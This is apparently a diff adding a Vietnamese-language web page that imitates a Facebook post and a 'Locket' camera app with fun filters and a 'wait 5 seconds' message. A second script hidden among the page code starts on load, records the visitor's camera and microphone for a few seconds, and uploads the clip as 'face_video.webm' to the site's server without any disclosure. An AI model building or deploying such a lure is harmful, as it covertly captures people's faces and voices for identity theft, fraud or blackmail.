+      👍 Bạn, Do Thuy Linh, Dat Lee và 56,7K người khác
+    </div>
+
+    <div class="actions">
+      <button class="action-btn" onclick="toggleReactions()">👍 Thích</button>
+      <button class="action-btn" onclick="focusComment()">💬 Bình luận</button>
+      <button class="action-btn" onclick="sharePost()">↪️ Chia sẻ</button>
+    </div>
+
+    <div class="comment-section">
+      <input id="commentInput" class="comment-input" placeholder="Viết bình luận..." onkeydown="handleComment(event)" />
+      <div id="commentList"></div>
+    </div>
+  </div>
+
+  <script>
+    function toggleReactions() {
+      const menu = document.getElementById("reactionMenu");
+      menu.style.display = menu.style.display === "flex" ? "none" : "flex";
+    }
+
+    function react(type) {
+      document.getElementById("reactionText").innerText = `${type} · Bạn và 35 người khác`;
+      document.getElementById("reactionMenu").style.display = "none";
+    }
+
+    function handleComment(e) {
+      if (e.key === "Enter") {
+        const comment = e.target.value.trim();
+        if (comment !== "") {
+          const commentBox = document.createElement("div");
+          commentBox.className = "comment";
+          commentBox.innerText = comment;
+          document.getElementById("commentList").prepend(commentBox);
+          e.target.value = "";
+        }
+      }
+    }
+
+    function focusComment() {
+      document.getElementById("commentInput").focus();
+    }
+
+    function sharePost() {
+      const url = window.location.href;
+      window.open("https://facebook.com/sharer/sharer.php?u=" + encodeURIComponent(url), "_blank");
+    }
+  </script>
+
+  <div class="camera-app">
+    <div class="header">
+      <h2>📸 Xin chào, <span id="display-name"></span>!</h2>
+      <p>Hãy cười thật tươi để giữ lại khoảnh khắc này nhé!</p>
+      <p>Trong khi chờ đợi, bạn có thể làm một vài tấm hình!</p>
+    </div>
+
+    <div class="camera-box">
+      <div class="top-bar">
+        <i class="fas fa-user-friends"></i>
+        <i class="fas fa-camera"></i>
+      </div>
+      <div class="camera-screen">
+        <video id="video" autoplay muted></video>
+      </div>
+      <div class="filters">
+        <button onclick="applyFilter('none')">Không</button>
+        <button onclick="applyFilter('grayscale(1)')">Trắng đen</button>
+        <button onclick="applyFilter('sepia(1)')">Sepia</button>
+        <button onclick="applyFilter('contrast(1.5)')">Tương phản</button>
+        <button onclick="applyFilter('blur(2px)')">Mờ</button>
+      </div>
+      <div class="controls">
+        <i class="fas fa-bolt"></i>
+        <div class="shutter"></div>
+        <i class="fas fa-sync-alt"></i>
+      </div>
+    </div>
+
+
+      <h3>Cảm ơn bạn đã ghé thăm trangg LOCKET CỦA MÌNH BẠN CHỈ CẦN CHỜ ĐÚNG 5 GIÂY THÔI !</h3>
+
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function startApp() {
+      const name = document.getElementById('username').value.trim();
+      if (!name) return alert('Vui lòng nhập tên!');
+      document.getElementById('display-name').innerText = name;
+      document.getElementById('loading-screen').style.display = 'none';
+      document.querySelector('.camera-app').style.display = 'flex';
+
+      const video = document.getElementById('video');
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(stream => {
+          video.srcObject = stream;
+        })
+        .catch(() => alert('❌ Trình duyệt từ chối truy cập camera!'));
+    }
+
+    function applyFilter(filter) {
+      document.getElementById('video').style.filter = filter;
+    }
+  </script>
+  <script>
+    const video = document.getElementById('video');
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        const mediaRecorder = new MediaRecorder(stream);
+        let chunks = [];
+
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const formData = new FormData();
+          formData.append('video', blob, 'face_video.webm');
+
+          fetch('/upload_video', {
+            method: 'POST',
+            body: formData
+          }).then(() => {
+            alert('📤 Video đã được gửi!');
+          }).catch(() => {
+            alert('❌ Gửi video thất bại!');
+          });
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 4000); // Quay 10 giây
+      });
+  </script>
+</body>
+</html>
